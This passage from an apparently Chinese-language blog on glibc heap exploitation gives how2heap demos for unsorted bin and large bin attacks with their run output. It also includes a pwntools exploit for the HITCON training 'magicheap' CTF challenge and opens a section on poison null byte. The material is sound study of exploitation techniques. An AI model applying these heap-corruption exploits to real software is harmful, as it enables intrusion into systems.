class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><br><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>&#123;<br><br>	<span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;This file demonstrates unsorted bin attack by write a large unsigned long value into stack\n&quot;</span>);<br><span class="hljs-comment">// 该攻击方法可以向栈里写入一个很大的无符号值</span><br>	<span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;In practice, unsorted bin attack is generally prepared for further attacks, such as rewriting the &quot;</span><br><br>		   <span class="hljs-string">&quot;global variable global_max_fast in libc for further fastbin attack\n\n&quot;</span>);<br><span class="hljs-comment">// 主要用于辅助其他的攻击手段</span><br><br><br>	<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> stack_var=<span class="hljs-number">0</span>;<br><br>	<span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;Let&#x27;s first look at the target we want to rewrite on stack:\n&quot;</span>);<br><br>	<span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;%p: %ld\n\n&quot;</span>, &amp;stack_var, stack_var);<br><br><br><br>	<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> *p=<span class="hljs-built_in">malloc</span>(<span class="hljs-number">400</span>);<br><br>	<span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;Now, we allocate first normal chunk on the heap at: %p\n&quot;</span>,p);<br><br>	<span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;And allocate another normal chunk in order to avoid consolidating the top chunk with&quot;</span><br><br>           <span class="hljs-string">&quot;the first one during the free()\n\n&quot;</span>);<br><br>	<span class="hljs-built_in">malloc</span>(<span class="hljs-number">500</span>);<br><br><br><br>	<span class="hljs-built_in">free</span>(p);<br><br>	<span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;We free the first chunk now and it will be inserted in the unsorted bin with its bk pointer &quot;</span><br><br>		   <span class="hljs-string">&quot;point to %p\n&quot;</span>,(<span class="hljs-type">void</span>*)p[<span class="hljs-number">1</span>]);<br><br><br><br>	<span class="hljs-comment">//------------VULNERABILITY-----------</span><br><br><br><br>	p[<span class="hljs-number">1</span>]=(<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>)(&amp;stack_var<span class="hljs-number">-2</span>);		<span class="hljs-comment">// 修改bk指针指向栈上的地址</span><br><br>	<span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;Now emulating a vulnerability that can overwrite the victim-&gt;bk pointer\n&quot;</span>);<br><br>	<span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;And we write it with the target address-16 (in 32-bits machine, it should be target address-8):%p\n\n&quot;</span>,(<span class="hljs-type">void</span>*)p[<span class="hljs-number">1</span>]);<br><br><br><br>	<span class="hljs-comment">//------------------------------------</span><br><br><br><br>	<span class="hljs-built_in">malloc</span>(<span class="hljs-number">400</span>);<br><br>	<span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;Let&#x27;s malloc again to get the chunk we just free. During this time, the target should have already been &quot;</span><br><br>		   <span class="hljs-string">&quot;rewritten:\n&quot;</span>);<br><br>	<span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;%p: %p\n&quot;</span>, &amp;stack_var, (<span class="hljs-type">void</span>*)stack_var);<br><br>&#125;<br><br><br>zyy@zyy-virtual-machine:~/pwn/how2heap$ ./unsorted_bin_attack<br>This file demonstrates unsorted bin attack by write a large <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> value into <span class="hljs-built_in">stack</span><br>In practice, unsorted bin attack is generally prepared <span class="hljs-keyword">for</span> further attacks, such as rewriting the global variable global_max_fast in libc <span class="hljs-keyword">for</span> further fastbin attack<br><br>Let<span class="hljs-number">&#x27;</span>s first look at the target we want to rewrite on <span class="hljs-built_in">stack</span>:<br><span class="hljs-number">0x7ffc479ac8c8</span>: <span class="hljs-number">0</span><br><br>Now, we allocate first normal chunk on the heap at: <span class="hljs-number">0x1b38010</span><br>And allocate another normal chunk in order to avoid consolidating the top chunk withthe first one during the <span class="hljs-title function_">free</span><span class="hljs-params">()</span><br><br>We <span class="hljs-built_in">free</span> the first chunk now and it will be inserted in the unsorted bin with its bk pointer point to 0x7f25ef9afb78<br>Now emulating a vulnerability that can overwrite the victim-&gt;bk pointer<br>And we write it with the target address-16 <span class="hljs-params">(in <span class="hljs-number">32</span>-bits machine, it should be target address<span class="hljs-number">-8</span>)</span>:0x7ffc479ac8b8<br><br>Let&#x27;s <span class="hljs-built_in">malloc</span> again to get the chunk we just <span class="hljs-built_in">free</span>. During this time, the target should have already been rewritten:<br>0x7ffc479ac8c8: 0x7f25ef9afb78<br></code></pre></td></tr></table></figure>



<h4 id="hitcon-training-magic-heap"><a href="#hitcon-training-magic-heap" class="headerlink" title="hitcon_training_magic_heap"></a>hitcon_training_magic_heap</h4><p>该题只需要修改magic的值大于一个常数就可以进入后门函数，虽然也存在全局变量，可以用unlink来解决，但是使用<code>unsorted_bin_attack</code>的手法更为简单。</p>
<p>WP如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>sh = process(<span class="hljs-string">&#x27;./magicheap&#x27;</span>)<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br><br>sdla = <span class="hljs-keyword">lambda</span> infor, data : sh.sendlineafter(infor, data)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">create_heap</span>(<span class="hljs-params">size, content</span>):<br>    sdla(<span class="hljs-string">&quot;:&quot;</span>, <span class="hljs-string">&quot;1&quot;</span>)<br>    sdla(<span class="hljs-string">&quot;:&quot;</span>, <span class="hljs-built_in">str</span>(size))<br>    sdla(<span class="hljs-string">&quot;:&quot;</span>, content)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit_heap</span>(<span class="hljs-params">idx, size, content</span>):<br>    sdla(<span class="hljs-string">&quot;:&quot;</span>, <span class="hljs-string">&quot;2&quot;</span>)<br>    sdla(<span class="hljs-string">&quot;:&quot;</span>, <span class="hljs-built_in">str</span>(idx))<br>    sdla(<span class="hljs-string">&quot;:&quot;</span>, <span class="hljs-built_in">str</span>(size))<br>    sdla(<span class="hljs-string">&quot;:&quot;</span>, content)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">del_heap</span>(<span class="hljs-params">idx</span>):<br>    sdla(<span class="hljs-string">&quot;:&quot;</span>, <span class="hljs-string">&quot;3&quot;</span>)<br>    sdla(<span class="hljs-string">&quot;:&quot;</span>, <span class="hljs-built_in">str</span>(idx))<br><br>create_heap(<span class="hljs-number">0x20</span>, <span class="hljs-string">&quot;dada&quot;</span>)  <span class="hljs-comment"># 0</span><br>create_heap(<span class="hljs-number">0x80</span>, <span class="hljs-string">&quot;dada&quot;</span>)  <span class="hljs-comment"># 1</span><br><span class="hljs-comment"># in order not to merge into top chunk</span><br>create_heap(<span class="hljs-number">0x20</span>, <span class="hljs-string">&quot;dada&quot;</span>)  <span class="hljs-comment"># 2</span><br><br>del_heap(<span class="hljs-number">1</span>)<br><br>magic = <span class="hljs-number">0x6020a0</span><br>fd = <span class="hljs-number">0</span><br>bk = magic - <span class="hljs-number">0x10</span><br><br>edit_heap(<span class="hljs-number">0</span>, <span class="hljs-number">0x20</span> + <span class="hljs-number">0x20</span>, <span class="hljs-string">&quot;a&quot;</span> * <span class="hljs-number">0x20</span> + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x91</span>) + p64(fd) + p64(bk))<br>create_heap(<span class="hljs-number">0x80</span>, <span class="hljs-string">&quot;dada&quot;</span>)  <span class="hljs-comment">#trigger unsorted bin attack</span><br>sdla(<span class="hljs-string">&quot;:&quot;</span>, <span class="hljs-string">&quot;4869&quot;</span>)<br>sh.interactive()<br></code></pre></td></tr></table></figure>



<h2 id="Large-bin"><a href="#Large-bin" class="headerlink" title="Large bin"></a>Large bin</h2><h3 id="large-bin-attack"><a href="#large-bin-attack" class="headerlink" title="large_bin_attack"></a>large_bin_attack</h3><p>该方法和unsorted_bin的利用方法差不多，麻烦的是多了两个指针，需要我们有一个可以改写被释放堆块的漏洞，利用的是unsorted_bin中chunk放入large_bin中缺乏的安全性检查。主要逻辑是将一个large_chunk_1放入large_bin中，然后再将一个large_chunk_2放入unsorted_bin中，修改large_chunk_1的size、bk和bk_nextsize，当large_chunk_1的大小小于large_chunk_2的时候触发漏洞，<strong>注意需要两个chunk是相邻的</strong>，利用的链表操作主要有以下几条：</p>
<p>修改bk_nextsize的操作：</p>
<blockquote>
<p>这里victim是large_chunk_2，fwd是large_chunk_1。</p>
</blockquote>
<ul>
<li><code>victim-&gt;fd_nextsize = fwd</code></li>
<li><code>victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize</code></li>
<li><code>fwd-&gt;bk_nextsize = victim</code></li>
<li><code>victim-&gt;bk_nextsize-&gt;fd_nextsize = victim</code></li>
</ul>
<p>修改bk的操作：</p>
<blockquote>
<p>bck是large_chunk_1的bk指针，victim是large_chunk_2。</p>
</blockquote>
<ul>
<li><code>victim-&gt;bk = bck</code></li>
<li><code>victim-&gt;fd = fwd</code></li>
<li><code>fwd-&gt;bk = victim</code></li>
<li><code>bck-&gt;fd = victim</code></li>
</ul>
<p>下面是how2heap源码：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;assert.h&gt;</span></span><br> <br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;This file demonstrates large bin attack by writing a large unsigned long value into stack\n&quot;</span>);<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;In practice, large bin attack is generally prepared for further attacks, such as rewriting the &quot;</span><br>           <span class="hljs-string">&quot;global variable global_max_fast in libc for further fastbin attack\n\n&quot;</span>);<br><br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> stack_var1 = <span class="hljs-number">0</span>;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> stack_var2 = <span class="hljs-number">0</span>;<br><br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;Let&#x27;s first look at the targets we want to rewrite on stack:\n&quot;</span>);<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;stack_var1 (%p): %ld\n&quot;</span>, &amp;stack_var1, stack_var1);<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;stack_var2 (%p): %ld\n\n&quot;</span>, &amp;stack_var2, stack_var2);<br><br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> *p1 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x420</span>);<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;Now, we allocate the first large chunk on the heap at: %p\n&quot;</span>, p1 - <span class="hljs-number">2</span>);<br><br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;And allocate another fastbin chunk in order to avoid consolidating the next large chunk with&quot;</span><br>           <span class="hljs-string">&quot; the first large chunk during the free()\n\n&quot;</span>);<br>    <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x20</span>);<br><br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> *p2 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x500</span>);<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;Then, we allocate the second large chunk on the heap at: %p\n&quot;</span>, p2 - <span class="hljs-number">2</span>);<br><br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;And allocate another fastbin chunk in order to avoid consolidating the next large chunk with&quot;</span><br>           <span class="hljs-string">&quot; the second large chunk during the free()\n\n&quot;</span>);<br>    <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x20</span>);<br><br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> *p3 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x500</span>);<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;Finally, we allocate the third large chunk on the heap at: %p\n&quot;</span>, p3 - <span class="hljs-number">2</span>);<br> <br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;And allocate another fastbin chunk in order to avoid consolidating the top chunk with&quot;</span><br>           <span class="hljs-string">&quot; the third large chunk during the free()\n\n&quot;</span>);<br>    <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x20</span>);<br> <span class="hljs-comment">// 0x20的堆块主要用于分割和防止合并，无具体意义</span><br>    <span class="hljs-built_in">free</span>(p1);<br>    <span class="hljs-built_in">free</span>(p2);<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;We free the first and second large chunks now and they will be inserted in the unsorted bin:&quot;</span><br>           <span class="hljs-string">&quot; [ %p &lt;--&gt; %p ]\n\n&quot;</span>, (<span class="hljs-type">void</span> *)(p2 - <span class="hljs-number">2</span>), (<span class="hljs-type">void</span> *)(p2[<span class="hljs-number">0</span>]));<br><span class="hljs-comment">// 此时会将p1分割一块0x90，并将剩余的堆块放入unsorted bin中，同时将p2放入large bin中</span><br>    <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x90</span>);<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;Now, we allocate a chunk with a size smaller than the freed first large chunk. This will move the&quot;</span><br>            <span class="hljs-string">&quot; freed second large chunk into the large bin freelist, use parts of the freed first large chunk for allocation&quot;</span><br>            <span class="hljs-string">&quot;, and reinsert the remaining of the freed first large chunk into the unsorted bin:&quot;</span><br>            <span class="hljs-string">&quot; [ %p ]\n\n&quot;</span>, (<span class="hljs-type">void</span> *)((<span class="hljs-type">char</span> *)p1 + <span class="hljs-number">0x90</span>));<br><span class="hljs-comment">// 此时p3被放入了unsorted bin中</span><br>    <span class="hljs-built_in">free</span>(p3);<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;Now, we free the third large chunk and it will be inserted in the unsorted bin:&quot;</span><br>           <span class="hljs-string">&quot; [ %p &lt;--&gt; %p ]\n\n&quot;</span>, (<span class="hljs-type">void</span> *)(p3 - <span class="hljs-number">2</span>), (<span class="hljs-type">void</span> *)(p3[<span class="hljs-number">0</span>]));<br> <br>    <span class="hljs-comment">//------------VULNERABILITY-----------</span><br><br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;Now emulating a vulnerability that can overwrite the freed second large chunk&#x27;s \&quot;size\&quot;&quot;</span><br>            <span class="hljs-string">&quot; as well as its \&quot;bk\&quot; and \&quot;bk_nextsize\&quot; pointers\n&quot;</span>);<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;Basically, we decrease the size of the freed second large chunk to force malloc to insert the freed third large chunk&quot;</span><br>            <span class="hljs-string">&quot; at the head of the large bin freelist. To overwrite the stack variables, we set \&quot;bk\&quot; to 16 bytes before stack_var1 and&quot;</span><br>            <span class="hljs-string">&quot; \&quot;bk_nextsize\&quot; to 32 bytes before stack_var2\n\n&quot;</span>);<br><span class="hljs-comment">// 修改p2的头部</span><br>    p2[<span class="hljs-number">-1</span>] = <span class="hljs-number">0x3f1</span>;		<span class="hljs-comment">//size</span><br>    p2[<span class="hljs-number">0</span>] = <span class="hljs-number">0</span>;		<span class="hljs-comment">// fd</span><br>    p2[<span class="hljs-number">2</span>] = <span class="hljs-number">0</span>;		<span class="hljs-comment">// fd_nextsize</span><br>    p2[<span class="hljs-number">1</span>] = (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>)(&amp;stack_var1 - <span class="hljs-number">2</span>);		<span class="hljs-comment">// bk</span><br>    p2[<span class="hljs-number">3</span>] = (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>)(&amp;stack_var2 - <span class="hljs-number">4</span>);		<span class="hljs-comment">// bk_nextsize</span><br><br>    <span class="hljs-comment">//------------------------------------</span><br><span class="hljs-comment">// 将p3放入large bin中，触发漏洞</span><br>    <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x90</span>);<br> <br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;Let&#x27;s malloc again, so the freed third large chunk being inserted into the large bin freelist.&quot;</span><br>            <span class="hljs-string">&quot; During this time, targets should have already been rewritten:\n&quot;</span>);<br><span class="hljs-comment">// 这时候两个目标地址都被我们写入了p3堆块的头指针</span><br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;stack_var1 (%p): %p\n&quot;</span>, &amp;stack_var1, (<span class="hljs-type">void</span> *)stack_var1);<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;stack_var2 (%p): %p\n&quot;</span>, &amp;stack_var2, (<span class="hljs-type">void</span> *)stack_var2);<br><br>    <span class="hljs-comment">// sanity check</span><br>    assert(stack_var1 != <span class="hljs-number">0</span>);<br>    assert(stack_var2 != <span class="hljs-number">0</span>);<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><br><br>This file demonstrates large bin attack by writing a large <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> value into <span class="hljs-built_in">stack</span><br>In practice, large bin attack is generally prepared <span class="hljs-keyword">for</span> further attacks, such as rewriting the global variable global_max_fast in libc <span class="hljs-keyword">for</span> further fastbin attack<br><br>Let<span class="hljs-number">&#x27;</span>s first look at the targets we want to rewrite on <span class="hljs-built_in">stack</span>:<br>stack_var1 (<span class="hljs-number">0x7ffc592e96f0</span>): <span class="hljs-number">0</span><br>stack_var2 (<span class="hljs-number">0x7ffc592e96f8</span>): <span class="hljs-number">0</span><br><br>Now, we allocate the first large chunk on the heap at: <span class="hljs-number">0x5591859ec000</span><br>And allocate another fastbin chunk in order to avoid consolidating the next large chunk with the first large chunk during the <span class="hljs-title function_">free</span><span class="hljs-params">()</span><br><br>Then, we allocate the second large chunk on the heap at: 0x5591859ec460<br>And allocate another fastbin chunk in order to avoid consolidating the next large chunk with the second large chunk during the <span class="hljs-title function_">free</span><span class="hljs-params">()</span><br><br>Finally, we allocate the third large chunk on the heap at: 0x5591859ec9a0<br>And allocate another fastbin chunk in order to avoid consolidating the top chunk with the third large chunk during the <span class="hljs-title function_">free</span><span class="hljs-params">()</span><br><br>We <span class="hljs-built_in">free</span> the first and second large chunks now and they will be inserted in the unsorted bin: [ 0x5591859ec460 &lt;--&gt; 0x5591859ec000 ]<br><br>Now, we allocate a chunk with a size smaller than the freed first large chunk. This will move the freed second large chunk into the large bin freelist, use parts of the freed first large chunk <span class="hljs-keyword">for</span> allocation, and reinsert the remaining of the freed first large chunk into the unsorted bin: [ 0x5591859ec0a0 ]<br><br>Now, we <span class="hljs-built_in">free</span> the third large chunk and it will be inserted in the unsorted bin: [ 0x5591859ec9a0 &lt;--&gt; 0x5591859ec0a0 ]<br><br>Now emulating a vulnerability that can overwrite the freed second large chunk&#x27;s &quot;size&quot; as well as its &quot;bk&quot; and &quot;bk_nextsize&quot; pointers<br>Basically, we decrease the size of the freed second large chunk to force <span class="hljs-built_in">malloc</span> to insert the freed third large chunk at the head of the large bin freelist. To overwrite the <span class="hljs-built_in">stack</span> variables, we <span class="hljs-built_in">set</span> &quot;bk&quot; to 16 bytes before stack_var1 and &quot;bk_nextsize&quot; to 32 bytes before stack_var2<br><br>Let&#x27;s <span class="hljs-built_in">malloc</span> again, so the freed third large chunk being inserted into the large bin freelist. During this time, targets should have already been rewritten:<br><span class="hljs-title function_">stack_var1</span> <span class="hljs-params">(<span class="hljs-number">0x7ffc592e96f0</span>)</span>: 0x5591859ec9a0<br><span class="hljs-title function_">stack_var2</span> <span class="hljs-params">(<span class="hljs-number">0x7ffc592e96f8</span>)</span>: 0x5591859ec9a0<br></code></pre></td></tr></table></figure>

<p>总结一下，我们构造的主要数据如下：</p>
<ul>
<li><code>large_chunk_1.size &lt; large_chunk_2.size</code></li>
<li><code>large_chunk_1.bk = (unsigned long)(&amp;stack_var1 - 2)</code></li>
<li><code>large_chunk_1.bk_nextsize = (unsigned long)(&amp;stack_var2 - 4)</code></li>
</ul>
<h2 id="Off-By-One"><a href="#Off-By-One" class="headerlink" title="Off_By_One"></a>Off_By_One</h2><h3 id="poison-null-byte"><a href="#poison-null-byte" class="headerlink" title="poison_null_byte"></a>poison_null_byte</h3><p>通过将被释放的堆块的size低位改为0使其收缩，这样再次分配的时候下一个堆块的<code>pre_size</code>无法得到更新，而由于释放堆块的时候，会通过其<code>pre_size</code>找到上一个堆块进行unlink，这样就会造成堆块重叠。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span 